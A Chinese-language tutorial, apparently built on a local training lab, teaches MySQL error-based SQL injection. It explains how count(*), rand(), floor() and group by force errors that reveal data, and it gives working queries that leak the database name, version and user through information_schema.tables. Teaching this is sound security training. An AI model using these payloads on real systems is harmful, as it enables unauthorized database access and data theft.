      在此之前，我们先理解一下子查询，查询的关键字是select。简单地说，子查询就是在一个select语句里再嵌套一个select，就构成了子查询。







看一个简单的例子：

Select concat((select database()));

1.执行时，先从子查询进行，因此先执行select database()这个语句，就会把当前的数据库查出来。

2.然后把结果传入到concat函数，concat函数是用来连接的，比如 concat(‘a’,’b’)那结果就是ab了。



0x01 报错注入原理


1.需要理解四个函数/语句



1. Rand() //随机函数

2. Floor() //取整函数

3. Count() //汇总函数

4. Group by clause //分组语句



2.当在一个聚合函数，比如count函数后面如果同时使用group by 和 rand 函数时，就会把查询的一部分以错误的形式显示出来，部分敏感的信息就暴露出来了。


  

 0x02 SQL报错注入操作：



接下来，进入命令行一起操作吧！

（配合navicat一起食用更佳）

1.进入并切换数据库

  开启phpstudy,命令行中进入mysql文件夹

输入 mysql -u root –p  就会连接上数据库了

然后通过use security；进入security数据库

2.尝试子查询，concat(),rand(),floor()函数

a.我们执行一下前面那个简单的子查询的例子

     Select concat((select database()));   

就能显示security，也就是显示当前数据库的名字了

b.我们测试一下concat的用法。输入

 SELECT concat('String1','String2');    

显然结果就是String1String2了

c.然后我们测试一下rand()是干嘛的

    Select rand();     

 我们多执行几次

可以看出and()就是返回大于0，小于1之间的数

d.然后看看取整函数 floor();

Select floor(1.1123456);

就是对你输入的数向下取整

3.尝试函数组合

a.我们看看报错注入查询中的一个简单组合

 Select floor(rand()*2);

我们从里向外看，rand() 返回大于0小于1的小数，乘以2之后大于0小于2，然后floor对结果进行取整，得到0或1了。也就是这个查询的结果不是1，就是0。

b.我们稍微加大一点难度，看这个查询

Select concat ((select database()),floor(rand()*2)); 

先看最里面的Select database() 返回数据库名security，

然后floor(rand()*2)结果是0或1

两个的结果进行concat连接，

那么结果就是security0或者security1了。

如果我们把这条语句后面加上from 一个表名，那么一般会返回security0或security1的一个集合。数目是由表本身有几条结果决定的。比如一个管理表里有5个管理员。这个就会返回五条记录，这里users表里有13个用户，所以返回了13条

c.现在我们准备加上Group By语句了

我们使用information_schema.tables 这个表来查询。因为里面一般数据很多，容易生成很多的随机值，不至于全部是security0。

select concat((select database()), floor(rand()*2)) as a from information_schema.tables group by a;

上个语句中concat((select database()), floor(rand()*2) ) 这个结果取了一个别名 a ，然后使用a进行分组。这样相同的security0分到一组，security1分到一组，那么就剩两个结果了

ps：注意这里的database()，可以替换成任何你想查的函数，比如version(), user(), datadir()或者其他的查询，比如查表、查列,原理都是一样的。

最后的亮点来了！

d.我们输入这条：注意多了一个聚合函数count(*)

select count(*), concat((select database()), floor(rand()*2)) as a from information_schema.tables group by a;

想要查询版本就这样：

select count(*), concat((select version()), floor(rand()*2)) as a from information_schem a.tables group by a;

再看一个

select count(*), concat('~',(select user()),'~', floor(rand()*2)) as a from information_schema.tables group by a;

这里的~这个符号只是为了让结果更清晰。
